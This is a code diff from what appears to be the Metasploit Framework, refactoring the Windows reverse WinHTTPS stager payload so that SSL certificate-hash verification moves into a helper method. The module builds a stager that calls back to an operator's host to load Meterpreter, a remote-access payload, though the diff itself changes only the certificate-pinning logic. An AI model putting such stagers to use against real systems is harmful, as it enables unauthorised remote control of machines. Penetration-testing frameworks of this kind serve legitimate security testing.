@@ -49,27 +49,12 @@ module Payload::Windows::ReverseWinHttps
   #
   def generate
 
-    verify_cert = false
-    verify_cert_hash = nil
-
-    if datastore['StagerVerifySSLCert'].to_s =~ /^(t|y|1)/i
-      unless datastore['HandlerSSLCert']
-        raise ArgumentError, "StagerVerifySSLCert is enabled but no HandlerSSLCert is configured"
-      else
-        verify_cert = true
-        hcert = Rex::Parser::X509Certificate.parse_pem_file(datastore['HandlerSSLCert'])
-        unless hcert and hcert[0] and hcert[1]
-          raise ArgumentError, "Could not parse a private key and certificate from #{datastore['HandlerSSLCert']}"
-        end
-        verify_cert_hash = Rex::Text.sha1_raw(hcert[1].to_der)
-        print_status("Stager will verify SSL Certificate with SHA1 hash #{verify_cert_hash.unpack("H*").first}")
-      end
-    end
+    verify_cert_hash = get_ssl_cert_hash
 
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
 
-      if datastore['StagerVerifySSLCert'].to_s =~ /^(t|y|1)/i
+      if verify_cert_hash
         raise ArgumentError, "StagerVerifySSLCert is enabled but not enough payload space is available"
       end
 
@@ -78,7 +63,6 @@ module Payload::Windows::ReverseWinHttps
         host: datastore['LHOST'],
         port: datastore['LPORT'],
         url:  generate_small_uri,
-        verify_cert: verify_cert,
         verify_cert_hash: verify_cert_hash,
         retry_count: datastore['StagerRetryCount'])
     end
@@ -89,7 +73,6 @@ module Payload::Windows::ReverseWinHttps
       port: datastore['LPORT'],
       url:  generate_uri,
       exitfunk: datastore['EXITFUNC'],
-      verify_cert: verify_cert,
       verify_cert_hash: verify_cert_hash,
       retry_count: datastore['StagerRetryCount']
     }
@@ -112,6 +95,23 @@ module Payload::Windows::ReverseWinHttps
     end
 
     space
+  end
+
+  #
+  # Get the SSL hash from the certificate, if required.
+  #
+  def get_ssl_cert_hash
+    unless datastore['StagerVerifySSLCert'].to_s =~ /^(t|y|1)/i
+      return nil
+    end
+
+    unless datastore['HandlerSSLCert']
+      raise ArgumentError, "StagerVerifySSLCert is enabled but no HandlerSSLCert is configured"
+    end
+
+    hash = Rex::Parser::X509Certificate.get_cert_file_hash(datastore['HandlerSSLCert'])
+    print_status("Meterpreter will verify SSL Certificate with SHA1 hash #{hash.unpack("H*").first}")
+    hash
   end
 
 end
